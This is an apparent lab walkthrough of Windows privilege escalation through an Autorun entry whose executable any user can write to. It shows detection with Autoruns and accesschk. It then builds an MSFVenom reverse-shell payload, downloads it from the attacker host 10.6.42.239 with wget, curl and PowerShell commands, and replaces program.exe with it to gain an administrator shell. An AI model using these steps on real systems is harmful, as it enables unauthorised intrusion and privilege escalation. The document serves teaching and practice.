# Registry Escalation - Autorun

INITIAL ACCESS:

Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:

username: user
password: password321

For any administrative actions you might take, your credentials are:

username: TCM
password: Hacker123

Use the following `xfreerdp` command to initiate the RDP session:

```jsx
xfreerdp3 /v:10.10.222.119 /u:user /cert:ignore /sec:rdp
```

![image](https://github.com/user-attachments/assets/a7b8ac95-7f19-4c7f-a290-f5ed3f02bbb2)


Once connected to the victim machine, we need to serve the necessary tools for analysis. Start a simple HTTP server on your Kali 
Then, download the [Microsoft Sysinternals Suite](https://www.majorgeeks.com/mg/get/microsoft_sysinternals_suite,1.html) on the victim machine using your browser or via PowerShell.

```jsx
python -m http.server --bind 10.6.42.239 8999
```
![image](https://github.com/user-attachments/assets/0b389689-c449-4eae-b63d-c2309c8b16ff)


### 🔎 DETECTION

After transferring the tools, follow these steps to detect suspicious behavior:

1. Unzip the downloaded folder on the victim desktop.
2. Navigate to `Autoruns` and execute the following:

```jsx
C:\Tool PATH> Autoruns64.exe

```

1. In Autoruns, go to the **Logon** tab.
2. Observe an entry labeled **"My Program"**, pointing to the executable:

![image](https://github.com/user-attachments/assets/5b99b329-ed40-444b-a734-f355cc0b75fa)


To analyze permissions on this file, run:

```jsx

C:\Tool PATH> accesschk64.exe –wvu "C:\Program Files\Autorun Program\program.exe"
```

![image](https://github.com/user-attachments/assets/7ee47848-9ed2-4df5-9ea9-07f00d95d019)


From the output, you'll notice that the **Everyone** group has **FILE_ALL_ACCESS** permissions on `program.exe`—this is a security risk, as it allows any user to modify or replace the executable.

## 💥 EXPLOITATION (Privilege Escalation)

Now, let’s exploit the misconfigured permissions by replacing `program.exe` with a reverse shell payload.

1. Use a **reverse shell generator** (e.g., [Reverse Shell Generator](https://www.revshells.com/)) with the following settings:
    - **Payload**: `MSFVenom Windows Stageless Reverse TCP`
    - **Attacker IP**: `10.6.42.239`
    - **Port**: `your chosen port`

![image](https://github.com/user-attachments/assets/5e923bca-8636-4d1c-8511-5e316fbb6778)


1. Once the `.exe` payload is created (e.g., `reverse.exe`), transfer it to the victim machine using one of the following methods:

![image](https://github.com/user-attachments/assets/93dfd456-c98b-4a8d-962d-8dd65e1c28e8)


```jsx
wget http://10.6.42.239:8999/reverse.exe
curl -o Program.exe http://10.6.42.239:8999/reverse.exe
Invoke-WebRequest -Uri "http://10.6.42.239:8999/reverse.exe" -OutFile "reverse.exe"
Start-BitsTransfer -Source "http://10.6.42.239:8999/reverse.exe" -Destination "Program.exe"
```

Rename `reverse.exe` to program.exe and place in ‘C:\Program Files\Autorun Program’.

Now simulate a new session. Log off and then log back in using the **administrator account** (TCM).

Kali VM:

![image](https://github.com/user-attachments/assets/dd3e1302-94b8-474d-8410-65c8cd952691)


When the system executes the startup program (which now contains your payload), it will trigger the reverse shell and grant access with **administrator privileges** on your Kali machine.
